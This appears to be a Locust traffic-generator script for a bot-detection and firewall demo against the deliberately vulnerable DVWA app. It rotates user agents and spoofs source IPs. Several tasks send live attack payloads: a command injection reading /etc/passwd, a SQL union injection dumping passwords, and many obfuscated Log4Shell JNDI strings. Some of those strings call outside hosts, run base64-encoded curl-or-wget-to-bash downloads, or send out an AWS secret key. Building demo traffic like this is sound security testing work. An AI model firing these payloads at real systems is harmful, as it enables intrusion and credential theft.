####  Let's start keeping notes.  
####  5/24/2022 v0.2 - added more user agents and weighting to improve bot detection percentages for demo
####  7/6/2022 v0.3 - Tweaked login function to actually work for DVWA now



from locust import HttpUser, TaskSet, task, between
#from requests_toolbelt.adapters.source import SourceAddressAdapter
from ssladapter_modified import SourceAddressAdapter
import random
import requests
import urllib3
urllib3.disable_warnings()



def pick_ua():
    ua1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"   ## human
    ua2 = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3"  ## bad bot
    ua3 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"   ## human
    ua4 = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"  ## human
    ua5 = "Mozilla/5.0(iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F191 Safari/6533.18.5"  ## bad bot
    ua6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36"
    ua7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36"
    ua8 = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36"
    ua9 = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
    #ua = [ua1, ua2, ua3, ua4, ua5]
    #return(random.choice(ua))
    return(random.choices([ua1, ua2, ua3, ua4, ua5, ua6, ua7, ua8, ua9], weights=[60,15,60,60,15,60,60,60,60],k=1)[0])

class MyUser(HttpUser):
    def __init__(self, parent):
        super().__init__(parent)
        #print(self.locust.host)
    wait_time = between(5, 9)

    def login(self):
        #ua = pick_ua()
        self.client.get("/login.php", auth=("admin", "password"))
    # def on_start(self):
    #     self.new_session()

    # @task(1)
    # def new_session(self):
    #     if self.locust.session:
    #         self.locust.session.end()
    #     self.locust.session.create()
    #     ips = ["161.98.255.1", "37.60.63.2", "206.223.191.1", "23.26.110.2", "27.113.239.2", "42.97.255.1", "132.247.255.2", "14.192.95.1", "37.16.63.1", "49.213.31.2", "41.67.128.1", "27.97.1.2"]
    #     ip = random.choice(ips)
    #     self.client.verify = False
    #     #requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += '{cipher}'.format(cipher=currentcipher) 
    #     requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += 'ECDHE-RSA-AES256-SHA'
    #     self.client.mount("https://", SourceAddressAdapter(ip))
    #     self.client.mount("http://", SourceAddressAdapter(ip))
    #     login(self)

    # def logout(l):
    #     l.client.post("/logout", {"username":"ellen_key", "password":"education"})

    @task(100)
    def index(self):
        ua = pick_ua()
        self.client.get("/index.php", headers={'user-agent': ua}, verify=False)

    @task(100)
    def about(self):
        ua = pick_ua()
        self.client.get("/about.php", headers={'user-agent': ua}, verify=False)

    @task(100)
    def security(self):
        ua = pick_ua()
        self.client.get("/security.php", headers={'user-agent': ua}, verify=False)

    @task(10)
    def vuln_xss(self):
        ua = pick_ua()
        self.client.post("/vulnerabilities/exec/", headers={'user-agent': ua}, data={"ip": "ping 127.0.0.1 & cat /etc/passwd", "Submit": "Submit"}, verify=False)
        # with self.client.post("/vulnerabilities/exec/", headers={'user-agent': ua}, cookies=self.locust.client.cookies.get_dict(), data={"ip": "ping 127.0.0.1 & cat /etc/passwd", "Submit": "Submit"}, verify=False, catch_response=True) as response:
        #     if response.status_code == 403:
        #         response.success()

    @task(10)
    def vuln_sqli(self):
        ua = pick_ua()      
        self.client.post("/vulnerabilities/sqli/", headers={'user-agent': ua}, data={"id": "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #","Submit": "Submit"},verify=False)
        # with self.client.post("/vulnerabilities/sqli/", headers={'user-agent': ua}, cookies=self.locust.client.cookies.get_dict(), data={"id": "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #","Submit": "Submit"},verify=False, catch_response=True) as response:
        #     if response.status_code == 403:
        #         response.success()

    @task(100)
    def instructions(self):
        ua = pick_ua()
        self.client.get("/instructions.php", headers={'user-agent': ua}, verify=False)

    @task(10)
    def log4j_vuln(self):
        attacks = [
            '${jndi:${lower:l}${lower:d}a${lower:p}://example.com/x',
            '${jndi:ldap://attacker.com/a}',
            '${j${}ndi:ldap://attacker.com/a}',
            #'${java:ldap://attacker.com/a}',
            #'${java:vm}',
            '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}',
            '${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}',
            '${jndi:rmi://adsasd.asdasd.asdasd}',
            '${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}',
            '${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}',
            '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}',
            '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}',
            '${jndi:ldap://x.x.x.x/#Touch}',
            'Mozilla/5.0 ${jndi:ldap://x.x.x.x:5555/ExploitD}/ua',
            '${jndi:http://x.x.x.x/callback/https-port-443-and-http-callback-scheme}',
            '(+http://www.google.com/bot.html)${jndi:ldap://x.x.x.x:80/Log4jRCE}',
            '${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}',
            '${jndi:ldap://www.blogs.example.com.gu.c1me2000ssggnaro4eyyb.example.com/www.blogs.example.com}',
            '${jndi:dns://aeutbj.example.com/ext}',
            '${jndi:ldap://x.x.x.x:12344/Basic/Command/Base64/KGN1cmwgLXMgeC54LngueDo1ODc0L3kueS55Lnk6NDQzfHx3Z2V0IC1xIC1PLSB4LngueC54OjU4NzQveS55LnkueTo0NDMpfGJhc2g=}',
            '${jndi:${lower:l}${lower:d}a${lower:p}://example.com/x',
            '${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}',
            '${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1/poc',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC82Mi4xNTIuMTE4LjE2Nzo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC82Mi4xNTIuMTE4LjE2Nzo4MCl8YmFzaA==}',
            '${jndi:dns://waf.c2.avidemo.vmware.com.o9wpr53j36094avnc3i41m821zv0j453h.interact.sh}',
            '${jndi:dns://{{callback_host}}}',
            '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}',
            '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}',
            '${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}',
            '${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}',
            '${${::-j}ndi:rmi://{{callback_host}}/{{random}}}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}',
            '${jndi:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}',
            '${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6rj5oav1urrh0k38680cg5umyoyy8fgo.ab-ui.com}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6rj5oav1urrh0k38680cg5umyayy8f1n.ab-ui.com}',
            '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}',
            '${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}',
            '${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}',
            '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}',
            ]
        #for each in attacks:
        #print('-------------------')
        #print('Payload: ', each)
        # Authentication fails, because of missing JWT Token
        #headers = {'X-Forwarded-For': '12.12.12.12',
        #        'User-Agent': each}
        ua = (random.choice(attacks))
        self.client.get("/about.php", headers={'user-agent': ua}, verify=False, cookies=self.client.cookies.get_dict())

    def on_start(self):
        # List of IP's that can be used as "source" - hardcoded for simplicity (original list)
        #ips = ["161.98.255.1", "37.60.63.2", "206.223.191.1", "23.26.110.2", "27.113.239.2", "42.97.255.1", "132.247.255.2", "14.192.95.1", "37.16.63.1", "49.213.31.2", "41.67.128.1", "27.97.1.2"]
        # list of IPs for source, bot list
        ips = ["1.12.2.187", "5.39.14.101", "52.14.30.135", "67.223.120.87", "103.142.12.32", "109.237.177.16", "142.214.161.165", "78.108.177.52", "1.163.44.118"]
        ip = random.choice(ips)
        self.client.verify = False
        #requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += '{cipher}'.format(cipher=currentcipher) 
        #requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += 'ECDHE-RSA-AES256-SHA'
        self.client.mount("https://", SourceAddressAdapter(ip))
        self.client.mount("http://", SourceAddressAdapter(ip))
        self.login()

    # def on_stop(self):
    #     logout(self)

